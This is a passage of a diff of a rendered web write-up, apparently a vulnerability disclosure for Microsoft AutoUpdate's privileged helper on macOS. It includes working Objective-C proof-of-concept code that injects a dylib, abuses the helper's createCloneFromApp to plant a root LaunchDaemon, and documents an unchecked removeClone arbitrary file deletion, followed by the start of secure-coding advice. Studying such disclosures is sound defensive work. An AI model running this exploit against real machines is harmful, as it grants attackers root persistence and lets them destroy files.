+</span></span><span style="display:flex;"><span>- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">installUpdateWithPackage:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withXMLPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withAppPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg5</span>;
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">@end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__attribute__((constructor))
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> customConstructor(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>		NSString<span style="color:#555">*</span> my_plist <span style="color:#555">=</span> <span style="color:#c30">@&#34;&lt;?xml version=</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">1.0</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30"> encoding=</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">UTF-8</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">?&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;&lt;!DOCTYPE plist PUBLIC </span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">-//Apple Computer//DTD PLIST 1.0//EN</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30"> </span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">http://www.apple.com/DTDs/PropertyList-1.0.dtd</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;&lt;plist version=</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">1.0</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;&lt;dict&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;  &lt;key&gt;Label&lt;/key&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;  &lt;string&gt;com.sample.Load&lt;/string&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;  &lt;key&gt;ProgramArguments&lt;/key&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;  &lt;array&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;	   &lt;string&gt;/bin/zsh&lt;/string&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#c30">&#34;      &lt;string&gt;-c&lt;/string&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#c30">&#34;      &lt;string&gt;touch /Library/msauexp.txt&lt;/string&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;  &lt;/array&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;	 &lt;key&gt;RunAtLoad&lt;/key&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;	 &lt;true/&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;&lt;/dict&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#c30">&#34;&lt;/plist&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>        [my_plist <span style="color:#99f">writeToFile</span>:<span style="color:#c30">@&#34;/tmp/com.sample.Load.plist&#34;</span> <span style="color:#99f">atomically</span>:<span style="color:#366">YES</span> <span style="color:#99f">encoding</span>:NSASCIIStringEncoding <span style="color:#99f">error</span>:<span style="color:#366">nil</span>];
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>        NSString<span style="color:#555">*</span>  _serviceName <span style="color:#555">=</span> kXPCHelperMachServiceName;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        NSXPCConnection<span style="color:#555">*</span> _agentConnection <span style="color:#555">=</span> [[NSXPCConnection alloc] <span style="color:#99f">initWithMachServiceName</span>:_serviceName <span style="color:#99f">options</span>:<span style="color:#f60">4096</span>];
+</span></span><span style="display:flex;"><span>        [_agentConnection <span style="color:#99f">setRemoteObjectInterface</span>:[NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(MAUHelperToolProtocol)]];
+</span></span><span style="display:flex;"><span>        [_agentConnection resume];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#09f;font-style:italic">//        run user script as root/
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>        [[_agentConnection <span style="color:#99f">remoteObjectProxyWithErrorHandler</span>:<span style="color:#555">^</span>(NSError<span style="color:#555">*</span> error) {
+</span></span><span style="display:flex;"><span>            (<span style="color:#078;font-weight:bold">void</span>)error;
+</span></span><span style="display:flex;"><span>            NSLog(<span style="color:#c30">@&#34;Connection Failure&#34;</span>);
+</span></span><span style="display:flex;"><span>        }] <span style="color:#99f">createCloneFromApp</span>:<span style="color:#c30">@&#34;/tmp/com.sample.Load.plist&#34;</span> <span style="color:#99f">withClonePath</span>:<span style="color:#c30">@&#34;/Library/LaunchDaemons/&#34;</span> <span style="color:#99f">withReply</span>:<span style="color:#555">^</span>(NSString <span style="color:#555">*</span> err){
+</span></span><span style="display:flex;"><span>            NSLog(<span style="color:#c30">@&#34;Reply, %@&#34;</span>, err);
+</span></span><span style="display:flex;"><span>        }];
+</span></span><span style="display:flex;"><span>        NSLog(<span style="color:#c30">@&#34;Done!&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compile:</p>
 <pre tabindex="0"><code>gcc -dynamiclib -framework Foundation mauexp.m -o mauexp.dylib
 </code></pre><p>To run our exploit, we need to inject it into the old MSAU application.</p>
 <pre tabindex="0"><code>DYLD_INSERT_LIBRARIES=mauexp.dylib ~/Downloads/Microsoft\ AutoUpdate.app/Contents/MacOS/Microsoft\ AutoUpdate`
 </code></pre><p>Upon reboot our embedded script will be run, and eventually a file will be created at <code>/Library/mauresult.txt</code>.</p>
 <h2 id="removeclone---arbitrary-file-deletion-vulnerability">removeClone - Arbitrary file deletion vulnerability</h2>
 <p>As we can talk to the privilege helper tool, we can also invoke its other functions. The function <code>removeClone</code> offers an arbitrary file deletion. We can pass in a filename, and that will be deleted, without any further checks.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#09f;font-style:italic">/* @class MAUHelperTool */</span>
--(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
-    r13 <span style="color:#555">=</span> <span style="color:#366">self</span>;
-    r14 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
-    r15 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
-    [r13 <span style="color:#99f">setErrorString</span>:<span style="color:#f60">0x0</span>];
-    rax <span style="color:#555">=</span> [NSFileManager defaultManager];
-    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
-    r12 <span style="color:#555">=</span> rax;
-    <span style="color:#069;font-weight:bold">if</span> ([rax <span style="color:#99f">removeItemAtPath</span>:r14 <span style="color:#99f">error</span>:<span style="color:#f60">0x0</span>] <span style="color:#555">==</span> <span style="color:#f60">0x0</span>) {
-            [r13 <span style="color:#99f">setErrorString</span>:<span style="color:#c30">@&#34;Error removing clone&#34;</span>];
-    }
-    (<span style="color:#555">*</span>(r15 <span style="color:#555">+</span> <span style="color:#f60">0x10</span>))(r15, [r13 errorString]);
-    [r12 <span style="color:#069;font-weight:bold">release</span>];
-    [r15 <span style="color:#069;font-weight:bold">release</span>];
-    [r14 <span style="color:#069;font-weight:bold">release</span>];
-    <span style="color:#069;font-weight:bold">return</span>;
-}
-</code></pre></div><h2 id="secure-coding-best-practice">Secure coding best practice</h2>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class MAUHelperTool */</span>
+</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
+</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> <span style="color:#366">self</span>;
+</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    r15 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    [r13 <span style="color:#99f">setErrorString</span>:<span style="color:#f60">0x0</span>];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [NSFileManager defaultManager];
+</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> rax;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> ([rax <span style="color:#99f">removeItemAtPath</span>:r14 <span style="color:#99f">error</span>:<span style="color:#f60">0x0</span>] <span style="color:#555">==</span> <span style="color:#f60">0x0</span>) {
+</span></span><span style="display:flex;"><span>            [r13 <span style="color:#99f">setErrorString</span>:<span style="color:#c30">@&#34;Error removing clone&#34;</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    (<span style="color:#555">*</span>(r15 <span style="color:#555">+</span> <span style="color:#f60">0x10</span>))(r15, [r13 errorString]);
+</span></span><span style="display:flex;"><span>    [r12 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    [r15 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    [r14 <span style="color:#069;font-weight:bold">release</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="secure-coding-best-practice">Secure coding best practice</h2>
 <ol>
 <li>The client process verification in the <code>shouldAcceptNewConnection</code> call should verify the the following:</li>
 </ol>
